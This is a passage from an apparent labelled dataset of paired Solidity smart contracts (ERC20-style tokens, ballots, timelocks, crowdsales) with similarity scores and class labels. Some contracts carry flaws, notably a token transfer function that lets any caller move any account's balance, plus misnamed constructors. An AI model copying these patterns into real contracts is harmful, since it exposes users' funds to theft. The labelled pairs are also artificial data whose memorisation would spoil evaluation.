        totalSupply = 12000000 * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        
    }

    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);

        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {
        require(_value <= allowance[_from][msg.sender]); 
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public
    returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns(bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns(bool success) {
        require(balanceOf[msg.sender] >= _value); 
        balanceOf[msg.sender] -= _value; 
        totalSupply -= _value; 
        emit Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns(bool success) {
        require(balanceOf[_from] >= _value); 
        require(_value <= allowance[_from][msg.sender]); 
        balanceOf[_from] -= _value; 
        allowance[_from][msg.sender] -= _value; 
        totalSupply -= _value; 
        emit Burn(_from, _value);
        return true;
    }
}",2,,,,,
"contract dappHearts {

        using SafeMath for uint256;

        
        address public contractOwner;
        
        address public lastAddress;

        
        modifier onlyContractOwner {
            require(msg.sender == contractOwner);
            _;
        }

        
        constructor() public {
            contractOwner = msg.sender;
        }

        
        function withdraw() public onlyContractOwner {
            contractOwner.transfer(address(this).balance);
        }

        
        mapping(uint256 => uint256) public totals;

        
        function update(uint256 dapp_id) public payable {
            require(msg.value > 1900000000000000);
            totals[dapp_id] = totals[dapp_id] + msg.value;
            
            lastAddress.transfer(msg.value.div(2));
            lastAddress = msg.sender;
        }

        
        function getTotalHeartsByDappId(uint256 dapp_id) public view returns(uint256) {
            return totals[dapp_id];
        }

        
        function getBalance() public view returns(uint256){
            return address(this).balance;
        }

    }",0.990975303,"contract dappVolumeHearts {

	using SafeMath for uint256;

	
	address public contractOwner;
	
	address public lastAddress;

	
	modifier onlyContractOwner {
		require(msg.sender == contractOwner);
		_;
	}

	
	constructor() public {
		contractOwner = msg.sender;
	}

	
	function withdraw() public onlyContractOwner {
		contractOwner.transfer(address(this).balance);
	}

	
	mapping(uint256 => uint256) public totals;

	
	function update(uint256 dapp_id) public payable {
		require(msg.value > 1900000000000000);
		totals[dapp_id] = totals[dapp_id] + msg.value;
		
		lastAddress.transfer(msg.value.div(2));
		lastAddress = msg.sender;
	}

	
	function getTotalHeartsByDappId(uint256 dapp_id) public view returns(uint256) {
		return totals[dapp_id];
	}

	
	function getBalance() public view returns(uint256){
		return address(this).balance;
	}

}",1,,,,,
"contract Ballot {

    struct Voter {
        uint weight;
        bool voted;
        uint8 vote;
        address delegate;
    }
    struct Proposal {
        uint voteCount;
    }

    address chairperson;
    mapping(address => Voter) voters;
    Proposal[] proposals;

    
    constructor(uint8 _numProposals) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;
        proposals.length = _numProposals;
    }

    
    
    function giveRightToVote(address toVoter) public {
        if (msg.sender != chairperson || voters[toVoter].voted) return;
        voters[toVoter].weight = 1;
    }

    
    function delegate(address to) public {
        Voter storage sender = voters[msg.sender]; 
        if (sender.voted) return;
        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)
            to = voters[to].delegate;
        if (to == msg.sender) return;
        sender.voted = true;
        sender.delegate = to;
        Voter storage delegateTo = voters[to];
        if (delegateTo.voted)
            proposals[delegateTo.vote].voteCount += sender.weight;
        else
            delegateTo.weight += sender.weight;
    }

    
    function vote(uint8 toProposal) public {
        Voter storage sender = voters[msg.sender];
        if (sender.voted || toProposal >= proposals.length) return;
        sender.voted = true;
        sender.vote = toProposal;
        proposals[toProposal].voteCount += sender.weight;
    }

    function winningProposal() public constant returns (uint8 _winningProposal) {
        uint256 winningVoteCount = 0;
        for (uint8 prop = 0; prop < proposals.length; prop++)
            if (proposals[prop].voteCount > winningVoteCount) {
                winningVoteCount = proposals[prop].voteCount;
                _winningProposal = prop;
            }
    }
}",0.989486068,"contract shy {



    struct Voter {

        uint weight;

        bool voted;

        uint8 vote;

        address delegate;

    }

    struct Proposal {

        uint voteCount;

    }



    address chairperson;

    mapping(address => Voter) voters;

    Proposal[] proposals;



    

    constructor(uint8 _numProposals) public {

        chairperson = msg.sender;

        voters[chairperson].weight = 1;

        proposals.length = _numProposals;

    }



    

    

    function giveRightToVote(address toVoter) public {

        if (msg.sender != chairperson || voters[toVoter].voted) return;

        voters[toVoter].weight = 1;

    }



    

    function delegate(address to) public {

        Voter storage sender = voters[msg.sender]; 

        if (sender.voted) return;

        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)

            to = voters[to].delegate;

        if (to == msg.sender) return;

        sender.voted = true;

        sender.delegate = to;

        Voter storage delegateTo = voters[to];

        if (delegateTo.voted)

            proposals[delegateTo.vote].voteCount += sender.weight;

        else

            delegateTo.weight += sender.weight;

    }



    

    function vote(uint8 toProposal) public {

        Voter storage sender = voters[msg.sender];

        if (sender.voted || toProposal >= proposals.length) return;

        sender.voted = true;

        sender.vote = toProposal;

        proposals[toProposal].voteCount += sender.weight;

    }



    function winningProposal() public view returns (uint8 _winningProposal) {

        uint256 winningVoteCount = 0;

        for (uint8 prop = 0; prop < proposals.length; prop++)

            if (proposals[prop].voteCount > winningVoteCount) {

                winningVoteCount = proposals[prop].voteCount;

                _winningProposal = prop;

            }

    }

}",1,,,,,
"contract TokenTimelock {

  newERC20 token;
  address beneficiary;
  uint releaseTime;


  function timelock(newERC20 _token, address _beneficiary, uint _releaseTime) public {
    require(_releaseTime > now);
    token = _token;
    beneficiary = _beneficiary;
    releaseTime = _releaseTime;
  }
  function claim() public {
    require(msg.sender == beneficiary);
    require(now >= releaseTime);

    uint amount = token.balanceOf(this);
    

    require(amount > 0);

    token.transfer(beneficiary, amount);
  }
}",0.9417578,"contract TokenTimelock {



    

    ERC20Basic token;



    

    address beneficiary;



    

    uint releaseTime;



    constructor(ERC20Basic _token, address _beneficiary, uint _releaseTime) public {

        require(_releaseTime > now);

        token = _token;

        beneficiary = _beneficiary;

        releaseTime = _releaseTime;

    }



    

    function claim() public {

        require(msg.sender == beneficiary);

        require(now >= releaseTime);



        uint amount = token.balanceOf(this);

        require(amount > 0);



        token.transfer(beneficiary, amount);

    }

}",3,*,,,,
"contract mortal {
    address owner;

    function mortal()  { owner = msg.sender; }
    function kill() { if(msg.sender == owner) suicide(owner); }
}",0.924224132,"contract mortal
{
    address owner;

    function mortal() { owner = msg.sender; }
    function kill() { if(msg.sender == owner) selfdestruct(owner); }
}",2,,,,,
"contract ReserveToken {

    string public name = ""Reserve"";      
    string public symbol = ""RST"";           
    uint256 public decimals = 6;            

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    uint256 public totalSupply = 50000000000000;
    bool public stopped = false;

    uint256 constant valueFounder = 100000000000000000;
    address owner = 0x0;

    modifier isOwner {
        assert(owner == msg.sender);
        _;
    }

    modifier isRunning {
        assert (!stopped);
        _;
    }

    modifier validAddress {
        assert(0x0 != msg.sender);
        _;
    }

    function ExominiumToken(address _addressFounder) {
        owner = msg.sender;
        totalSupply = valueFounder;
        balanceOf[_addressFounder] = valueFounder;
        Transfer(0x0, _addressFounder, valueFounder);
    }

    function transfer(address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        require(allowance[_from][msg.sender] >= _value);
        balanceOf[_to] += _value;
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) isRunning validAddress returns (bool success) {
        require(_value == 0 || allowance[msg.sender][_spender] == 0);
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function stop() isOwner {
        stopped = true;
    }

    function start() isOwner {
        stopped = false;
    }

    function setName(string _name) isOwner {
        name = _name;
    }

    function burn(uint256 _value) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[0x0] += _value;
        Transfer(msg.sender, 0x0, _value);
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.982125611,"contract TreasureToken {

    string public name = ""Treasure Token"";      
    string public symbol = ""TST"";           
    uint256 public decimals = 8;            

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    uint256 public totalSupply = 0;
    bool public stopped = false;

    uint256 constant valueFounder = 1000000000000000000;
    address owner = 0x0;

    modifier isOwner {
        assert(owner == msg.sender);
        _;
    }

    modifier isRunning {
        assert (!stopped);
        _;
    }

    modifier validAddress {
        assert(0x0 != msg.sender);
        _;
    }

    function TreasureToken(address _addressFounder) {
        owner = msg.sender;
        totalSupply = valueFounder;
        balanceOf[_addressFounder] = valueFounder;
        Transfer(0x0, _addressFounder, valueFounder);
    }

    function transfer(address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) isRunning validAddress returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        require(allowance[_from][msg.sender] >= _value);
        balanceOf[_to] += _value;
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) isRunning validAddress returns (bool success) {
        require(_value == 0 || allowance[msg.sender][_spender] == 0);
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function stop() isOwner {
        stopped = true;
    }

    function start() isOwner {
        stopped = false;
    }

    function setName(string _name) isOwner {
        name = _name;
    }

    function burn(uint256 _value) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[0x0] += _value;
        Transfer(msg.sender, 0x0, _value);
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract Token {
    function transfer(address _to, uint _value) public returns (bool success);
}",0.915697336,"contract SNOVToken {
    function transfer(address _to, uint256 _value) public returns (bool success);
}",1,,,,,
"contract ABCD is Moderated {
            using SafeMath for uint256;

                string public name = ""ABCD22"";
                string public symbol = ""ABCD Eon Exchange Tokens22"";
                uint8 public decimals = 18;

                uint256 public maximumTokenIssue = 30000000 * 10**18;

                mapping(address => uint256) internal balances;
                mapping (address => mapping (address => uint256)) internal allowed;

                uint256 internal totalSupply_;

                event Approval(address indexed owner, address indexed spender, uint256 value);
                event Transfer(address indexed from, address indexed to, uint256 value);

                
                function totalSupply() public view returns (uint256) {
                    return totalSupply_;
                }

                
                function transfer(address _to, uint256 _value) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
                    return _transfer(msg.sender, _to, _value);
                }

                
                function transferFrom(address _from, address _to, uint256 _value) public ifUnrestricted onlyPayloadSize(3) returns (bool) {
                    require(_value <= allowed[_from][msg.sender]);
                    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
                    return _transfer(_from, _to, _value);
                }

                function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
                    
                    require(_to != address(0x0) && _to != address(this));
                    
                    require(_value <= balances[_from]);
                    
                    balances[_from] = balances[_from].sub(_value);
                    
                    balances[_to] = balances[_to].add(_value);
                    
                    Transfer(_from, _to, _value);
                    return true;
                }

                
                function balanceOf(address _owner) public view returns (uint256) {
                    return balances[_owner];
                }

                
                function approve(address _spender, uint256 _value) public ifUnrestricted onlyPayloadSize(2) returns (bool sucess) {
                    
                    require(allowed[msg.sender][_spender] == 0 || _value == 0);
                    allowed[msg.sender][_spender] = _value;
                    Approval(msg.sender, _spender, _value);
                    return true;
                }

                
                function allowance(address _owner, address _spender) public view returns (uint256) {
                    return allowed[_owner][_spender];
                }

                
                function increaseApproval(address _spender, uint256 _addedValue) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
                    require(_addedValue > 0);
                    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
                    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
                    return true;
                }

                
                function decreaseApproval(address _spender, uint256 _subtractedValue) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
                    uint256 oldValue = allowed[msg.sender][_spender];
                    require(_subtractedValue > 0);
                    if (_subtractedValue > oldValue) {
                        allowed[msg.sender][_spender] = 0;
                    } else {
                        allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
                    }
                    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
                    return true;
                }

                
                function generateTokens(address _to, uint _amount) internal returns (bool) {
                    totalSupply_ = totalSupply_.add(_amount);
                    balances[_to] = balances[_to].add(_amount);
                    Transfer(address(0x0), _to, _amount);
                    return true;
                }
                
                function () external payable {
                    revert();
                }

                function ABCD() public {
                    generateTokens(msg.sender, maximumTokenIssue);
                }

  }",0.970766535,"contract LEON is Moderated {	
	using SafeMath for uint256;

		string public name = ""LEONS Coin"";	
		string public symbol = ""LEONS"";			
		uint8 public decimals = 18;
		
		mapping(address => uint256) internal balances;
		mapping (address => mapping (address => uint256)) internal allowed;

		uint256 internal totalSupply_;

		
		uint256 public constant maximumTokenIssue = 200000000 * 10**18;
		
		event Approval(address indexed owner, address indexed spender, uint256 value); 
		event Transfer(address indexed from, address indexed to, uint256 value);		

		
		function totalSupply() public view returns (uint256) {
			return totalSupply_;
		}

		
		function transfer(address _to, uint256 _value) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
		    return _transfer(msg.sender, _to, _value);
		}

		
		function transferFrom(address _from, address _to, uint256 _value) public ifUnrestricted onlyPayloadSize(3) returns (bool) {
		    require(_value <= allowed[_from][msg.sender]);
		    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
		    return _transfer(_from, _to, _value);
		}		

		function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
			
			require(_to != address(0x0) && _to != address(this));
			
			require(_value <= balances[_from]);
			
			balances[_from] = balances[_from].sub(_value);	
			
			balances[_to] = balances[_to].add(_value);		
			
			Transfer(_from, _to, _value);
			return true;
		}

		
		function balanceOf(address _owner) public view returns (uint256) {
			return balances[_owner];
		}

		
		function approve(address _spender, uint256 _value) public ifUnrestricted onlyPayloadSize(2) returns (bool sucess) {
			
			require(allowed[msg.sender][_spender] == 0 || _value == 0);
			allowed[msg.sender][_spender] = _value;
			Approval(msg.sender, _spender, _value);
			return true;
		}

		
		function allowance(address _owner, address _spender) public view returns (uint256) {
			return allowed[_owner][_spender];
		}

		
		function increaseApproval(address _spender, uint256 _addedValue) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
			require(_addedValue > 0);
			allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
			Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
			return true;
		}

		
		function decreaseApproval(address _spender, uint256 _subtractedValue) public ifUnrestricted onlyPayloadSize(2) returns (bool) {
			uint256 oldValue = allowed[msg.sender][_spender];
			require(_subtractedValue > 0);
			if (_subtractedValue > oldValue) {
				allowed[msg.sender][_spender] = 0;
			} else {
				allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
			}
			Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
			return true;
		}

		
		function generateTokens(address _to, uint _amount) public onlyModerator returns (bool) {
		    require(isContract(moderator));
			require(totalSupply_.add(_amount) <= maximumTokenIssue);
			totalSupply_ = totalSupply_.add(_amount);
			balances[_to] = balances[_to].add(_amount);
			Transfer(address(0x0), _to, _amount);
			return true;
		}
				
    	function () external payable {
    	    revert();
    	}		
}",1,,,,,
"contract Token {

    mapping (address => uint256) public balanceOf;

    constructor(uint256 initialSupply) public {
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        return true;
    }
}",0.914298095,"contract Yoo {

    

    mapping (address => uint256) public balanceOf;



    

    function Yoo (

        uint256 initialSupply

        ) public {

        balanceOf[msg.sender] = initialSupply;              

    }



    

    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);           

        require(balanceOf[_to] + _value >= balanceOf[_to]); 

        balanceOf[msg.sender] -= _value;                    

        balanceOf[_to] += _value;                           

        return true;

    }

}",2,,,,,
"contract owned {
    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner) revert();
        _;
    }

    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",0.917944317,"contract Owned {
	
    address public owner;

	
    function Owned() {
        owner = msg.sender;
    }
	
	
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

	
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",2,,,,,
"contract MyToken {
    string public name;
    string public symbol;
    uint8 public decimals;

    mapping (address => uint256) public balanceOf;
    event Transfer(address _from, address _to, uint _value);

    constructor(string tokenName, string tokenSymbol, uint8 decimalUnits, uint256 initialSupply) public {
        name = tokenName;
        symbol = tokenSymbol;
        decimals = decimalUnits;
        balanceOf[msg.sender] = initialSupply;
        }

    function transfer(address _to, uint256 _value) public {
        require(_value <= balanceOf[msg.sender]);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
    }
}",0.950837739,"contract Overeat {
    
    string public name;
    
    string public symbol;
    
    uint public decimals;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    mapping(address => uint256) public balanceOf;


    
    constructor (uint256 initialSupply,string tokenName, string tokenSymbol, uint8 decimalUnits) public {
        
        balanceOf[msg.sender] = initialSupply;
        name = tokenName;                                 
        symbol = tokenSymbol;                               
        decimals = decimalUnits; 
    }

    
    function transfer(address _to,uint256 _value) public {
        
        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        
        emit Transfer(msg.sender, _to, _value);
    }

}",2,,,,,
"contract Crowdsale {
    using SafeMath for uint;
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    constructor (
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable public {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
       emit FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() public afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                   emit FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
               emit FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.975932577,"contract BobcoinPromotionAlpha {

    address public beneficiary;

    uint public fundingGoal;

    uint public amountRaised;

    uint public deadline;

    uint public price;

    token public tokenReward;

    mapping(address => uint256) public balanceOf;

    bool fundingGoalReached = false;

    bool crowdsaleClosed = false;



    event GoalReached(address recipient, uint totalAmountRaised);

    event FundTransfer(address backer, uint amount, bool isContribution);



    

    constructor (

        address ifSuccessfulSendTo,

        uint fundingGoalInEthers,

        uint durationInMinutes,

        uint miliEtherCostOfEachToken,

        address addressOfTokenUsedAsReward

    ) public {

        beneficiary = ifSuccessfulSendTo;

        fundingGoal = fundingGoalInEthers * 1 ether;

        deadline = now + durationInMinutes * 1 minutes;

        

        

        price = miliEtherCostOfEachToken * 0.00005 ether;

        

        tokenReward = token(addressOfTokenUsedAsReward);

    }



    

    function () payable public {

        require(!crowdsaleClosed);

        uint amount = msg.value;

        balanceOf[msg.sender] += amount;

        amountRaised += amount;

        

        

        tokenReward.transfer(msg.sender, amount * 10**18 / price);

        

       emit FundTransfer(msg.sender, amount, true);

    }



    modifier afterDeadline() { if (now >= deadline) _; }



    

    function checkGoalReached() public afterDeadline {

        if (amountRaised >= fundingGoal){

            fundingGoalReached = true;

            emit GoalReached(beneficiary, amountRaised);

        }

        crowdsaleClosed = true;

    }





    

    function safeWithdrawal() public afterDeadline {

        if (!fundingGoalReached) {

            uint amount = balanceOf[msg.sender];

            balanceOf[msg.sender] = 0;

            if (amount > 0) {

                if (msg.sender.send(amount)) {

                   emit FundTransfer(msg.sender, amount, false);

                } else {

                    balanceOf[msg.sender] = amount;

                }

            }

        }



        if (fundingGoalReached && beneficiary == msg.sender) {

            if (beneficiary.send(amountRaised)) {

               emit FundTransfer(beneficiary, amountRaised, false);

            } else {

                

                fundingGoalReached = false;

            }

        }

    }

}",1,,,,,
"contract DappToken {
    string  public name = ""DApp Token"";
    string  public symbol = ""DAPP"";
    string  public standard = ""DApp Token v1.0"";
    uint256 public totalSupply;

    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function DappToken2 (uint256 _initialSupply) public {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;

        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);

        return true;
    }
}",0.922784326,"contract	POLAND_WINS				{				

									

	mapping (address => uint256) public balanceOf;								

									

	string	public		name =	""	POLAND_WINS		""	;

	string	public		symbol =	""	NIGWI		""	;

	uint8	public		decimals =		18			;

									

	uint256 public totalSupply =		819626165099184000000000000					;	

									

	event Transfer(address indexed from, address indexed to, uint256 value);								

									

	function SimpleERC20Token() public {								

		balanceOf[msg.sender] = totalSupply;							

		emit Transfer(address(0), msg.sender, totalSupply);							

	}								

									

	function transfer(address to, uint256 value) public returns (bool success) {								

		require(balanceOf[msg.sender] >= value);							

									

		balanceOf[msg.sender] -= value;  

		balanceOf[to] += value;          

		emit Transfer(msg.sender, to, value);							

		return true;							

	}								

									

	event Approval(address indexed owner, address indexed spender, uint256 value);								

									

	mapping(address => mapping(address => uint256)) public allowance;								

									

	function approve(address spender, uint256 value)								

		public							

		returns (bool success)							

	{								

		allowance[msg.sender][spender] = value;							

		emit Approval(msg.sender, spender, value);							

		return true;							

	}								

									

	function transferFrom(address from, address to, uint256 value)								

		public							

		returns (bool success)							

	{								

		require(value <= balanceOf[from]);							

		require(value <= allowance[from][msg.sender]);							

									

		balanceOf[from] -= value;							

		balanceOf[to] += value;							

		allowance[from][msg.sender] -= value;							

		emit Transfer(from, to, value);							

		return true;							

	}								

}",3,,,,,
"contract StandardToken is Token {

    using SafeMath for uint;

    
    bool public locked;

    
    mapping (address => uint256) balances;

    
    mapping (address => mapping (address => uint256)) allowed;

    
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    
    function transfer(address _to, uint256 _value) returns (bool success) {

        
        require(!locked);

        
        require(balances[msg.sender] >= _value);

        
        require(balances[_to].add(_value) >= balances[_to]);

        
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);

        
        Transfer(msg.sender, _to, _value);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        
        require(!locked);

        
        require (balances[_from] >= _value);

        
        require(balances[_to].add(_value) >= balances[_to]);      

        
        require (_value <= allowed[_from][msg.sender]);

        
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);

        
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        
        Transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) returns (bool success) {

        
        require(!locked);

        
        allowed[msg.sender][_spender] = _value;

        
        Approval(msg.sender, _spender, _value);
        return true;
    }


    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
    }
}",0.931379954,"contract StandardToken is Token {

    using SafeMath for uint256;

    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(_to != address(0));

        require(balances[msg.sender] >= _value);

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }





    function transferFrom(address _from, address _to, uint256 _value) public returns 

    (bool success) {

        require(_to != address(0));

        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);

        balances[_to] = balances[_to].add(_value);

        balances[_from] = balances[_from].sub(_value); 

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        emit Transfer(_from, _to, _value);

        return true;

    }

    function balanceOf(address _owner) constant public returns (uint256 balance) {

        return balances[_owner];

    }





    function approve(address _spender, uint256 _value) public returns (bool success)   

    {

        require((_value == 0) || (allowed[msg.sender][_spender] == 0));

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }





    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

}",1,,,,,
"contract owned {

    constructor() public { owner = msg.sender; }
    address owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

}",0.904100632,"contract Owned

{

    address public owner;



    constructor() internal

    {

        owner = msg.sender;

    }

    modifier onlyowner()

    {

        require(msg.sender==owner);

        _;

    }

}",1,,,,,
"contract mortal is owned {
    function kill() public onlyOwner {
        selfdestruct(owner);
    }
}",0.911015925,"contract Killable is owned {

    function kill() onlyOwner public {

        selfdestruct(owner);

    }

}",1,,,,,
"contract FLOCK is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function FLOCK() {
        balances[msg.sender] = 10000000000;               
        totalSupply = 10000000000;                        
        name = ""FLOCK"";                                   
        decimals = 0;                                               
        symbol = ""FLK"";                                             
        unitsOneEthCanBuy = 50000;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.958770433,"contract Vanadium is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;; 
    uint256 public unitsOneEthCanBuy;     
